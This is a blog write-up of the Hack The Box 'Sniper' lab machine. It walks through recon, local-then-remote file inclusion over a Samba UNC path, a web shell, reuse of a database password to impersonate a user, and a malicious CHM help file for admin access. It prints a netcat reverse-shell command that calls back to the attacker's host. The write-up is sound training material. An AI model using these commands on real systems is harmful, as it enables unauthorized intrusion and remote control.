---
layout:     post
title:      HacktheBox Writeup - Sniper - padraignix.github.io
title2:     Hack the Box - Sniper
date:       2020-4-4 12:01:00 -0400
summary:    HTB Sniper machine walkthrough. From an initial LFI/RFI foothold within the company website, to abusing malicious Windows help files, Sniper presents the story of a disgruntled developer and their middle finger to the Administrator/CEO on their way out. Sniper was a fun machine with a new angle on the RFI approach I had not used before and allowed me an opportunity to work with CHM files, something I previously also had not done.
categories: hack-the-box
thumbnail:  cogs
keywords:   hackthebox,htb,pentest,redteam,infosec,cybersecurity,forest,active directory,AD,bloodhound,pass-the-hash,pth,mimikatz
thumbnail:  https://padraignix.github.io/assets/htb-sniper/infocard.PNG
canon:      https://padraignix.github.io/hack-the-box/2020/04/04/htb-machine-sniper/
tags:
 - htb 
 - walkthrough
 - writeup
 - lfi
 - rfi
 - samba
 - chm
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-sniper/infocard.PNG' | relative_url }}">
</p>

<p>From an initial LFI/RFI foothold within the company website, to abusing malicious Windows help files, Sniper presents the story of a disgruntled developer and their middle finger to the Administrator/CEO on their way out. Sniper was a fun machine with a new angle on the RFI approach I had not used before and allowed me an opportunity to work with CHM files, something I previously also had not done. </p>

<h1>Initial Recon</h1>

<p>Let's start off this machine with an NMAP scan to see what we are working with.</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Sniper# nmap -sV -sC -p- 10.10.10.151
Starting Nmap 7.70 ( https://nmap.org ) at 2019-11-01 17:53 EDT
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 46.77% done; ETC: 17:57 (0:02:19 remaining)
Stats: 0:02:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.17% done; ETC: 17:56 (0:00:34 remaining)
Stats: 0:04:21 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.85% done; ETC: 17:57 (0:00:00 remaining)
Nmap scan report for 10.10.10.151
Host is up (0.019s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m46s, deviation: 0s, median: 7h00m46s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-11-02 00:58:03
|_  start_date: N/A
{% endhighlight %}

<p>We boot up Burp and go take a look at the webpage. Interesting, looks like a company called "Sniper Co.".</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-site.PNG' | relative_url }}">
</p>

<p>Poking around the site and taking a look at Burp we find a few interesting things. First we see there is a /user/registration.php page.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-site3.PNG' | relative_url }}">
</p>

<p>Looks like we can register a user. Let's create a new test/test account and see if there is anything useful on the other side.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-site2.PNG' | relative_url }}">
</p>

<p>Bummer, doesn't seem like there is much else here even when poking at the source. Let's move on to the blog page. There seems to be an interesting way they load the different language files. We can give a local file inclusion angle a shot and see if we can get any information back. We choose a standard Windows file.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-lfi.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-lfi2.PNG' | relative_url }}">
</p>

<p>Alright, we are starting to make some progress. I tried kicking off an Apache instance locally and attempted transforming the LFI to an RFI. Unfortunately it was not calling back the files hosted on my local machine. A bit of digging later stumbled on to a <a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">post</a> going into details of how to perform these types of RFI attacks leveraging a Samba instance and UNC paths rather than a regular HTTP address. The breakdown is essentially that PHP has <code>allow_url_include</code> set to off by default. By leveraging a UNC path rather than HTTP we can inject the remote location and get it called successfully.</p>

<p>Alright, getting our local Samba installation running and using a trusty WebShell manage to successfully get a foothold on the host! I skipped a few screenshots of getting the following steps ready but it boiled down to creating a new folder that our iusr had rights to then upload a netcat executable. From there we should be able to establish a shell connection to our host.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/recon-webshell.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>With our shell connection established we take a look at the directory and what we can see.</p>

{% highlight shell %}
 Directory of C:\inetpub\wwwroot\user

10/01/2019  08:44 AM    <DIR>          .
10/01/2019  08:44 AM    <DIR>          ..
04/11/2019  05:15 PM               108 auth.php
04/11/2019  05:52 AM    <DIR>          css
04/11/2019  10:51 AM               337 db.php
04/11/2019  05:23 AM    <DIR>          fonts
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  06:18 AM             4,639 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  06:10 AM             6,463 login.php
04/08/2019  11:04 PM               148 logout.php
10/01/2019  08:42 AM             7,192 registration.php
08/14/2019  10:35 PM             7,004 registration_old123123123847.php
04/11/2019  05:23 AM    <DIR>          vendor
               7 File(s)         25,891 bytes
               7 Dir(s)  17,926,541,312 bytes free
{% endhighlight %}

<p>There are a few files here that we didn't see in our initial web recon. Taking a poke inside a few and we find something quite interesting.</p>

{% highlight shell %}
C:\inetpub\wwwroot\user>type db.php
type db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
{% endhighlight %}

<p>Very interesting... looks like we have a password. Now let's find our username. A quick check under C:\Users and we see that there are two user directories: Administrator and Chris. Let's assume Chris is our user level access and attempt to pivot from iusr to Chris. Unlike a linux based "su username" Windows impersonation is a bit more involved. There is a good explanation of how to perform that <a href="https://superuser.com/questions/1371922/switch-user-in-powershell-like-sudo-su-in-unix-linux">on this post</a>. So let's give that a shot.</p>

{% highlight shell %}
$user = "Sniper\Chris"
$pass = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user,$pass)
Invoke-Command -Computer Sniper -ScriptBlock { mkdir C:\temp2 } -Credential $cred
PS C:\> cd temp2
cd temp2
PS C:\temp2> cp ..\temp\nc64.exe .
PS C:\temp2> Invoke-Command -Computer Sniper -ScriptBlock { C:\temp2\nc64.exe 10.10.14.29 31337 -e cmd.exe } -Credential $cred
Invoke-Command -Computer Sniper -ScriptBlock { C:\temp2\nc64.exe 10.10.14.29 31337 -e cmd.exe } -Credential $cred
{% endhighlight %}

<p>And with our listening shell ready and waiting...</p>

{% highlight shell %}
root@kali:~/Desktop/HTB/Sniper# nc -lnvp 31337
Listening on [0.0.0.0] (family 2, port 31337)
Connection from 10.10.10.151 49742 received!
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents>whoami
whoami
sniper\chris

...

C:\Users\Chris\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Desktop

04/11/2019  08:15 AM    <DIR>          .
04/11/2019  08:15 AM    <DIR>          ..
04/11/2019  08:15 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  17,985,708,032 bytes free

C:\Users\Chris\Desktop>type user.txt
type user.txt
21f4d0f2*********************
C:\Users\Chris\Desktop>
{% endhighlight %}

<p>No time to sleep we need to continue down the rabbit hole.</p>

<h1>Root exploitation</h1>

<p>If we take a look at Chris' files we notice something interesting in the downloads. There is a file: instructions.chm. I wasn't too familiar with the file format so a quick search later and quickly find out it's a help file format. We are able to get it decompiled to a readable format. Seems our Chris is not exactly happy with his current situation, nor is his opinion of the CEO too flaterring.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/root-chm.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/root-chmsnipe.PNG' | relative_url }}">
</p>

<p>A bit more recon and we find a Docs folder under the C:\ drive. Seems our CEO was also not a great fan of Chris.</p>

{% highlight shell %}
PS C:\Docs> type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
{% endhighlight %}

<p>So this seemed quite interesting. If we read between the lines we can assume that the CEO, assumingly the Administrator, is performing some form of processing based on a file we are supposed to put in this directory. Some searching around and I stumbled on to <a href="https://github.com/samratashok/nishang">Nishang's github repo</a> where he provided a utility to craft chm based exploits. I ended up having to open up my Windows VM but managed to get the file crafted.</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/root-chmpayload.PNG' | relative_url }}">
</p>

<p>Then if we move it over to C:\Docs and go check our temp2 folder, our root flag is present!</p>

<p align="center">
<img src="{{ '/assets/htb-sniper/root-owned.PNG' | relative_url }}">
</p>

<p>Just like that our journey with Sniper is done. Maybe we will have a sequel and see what ends up happening between the CEO and Chris. Thanks folks, until next time!</p>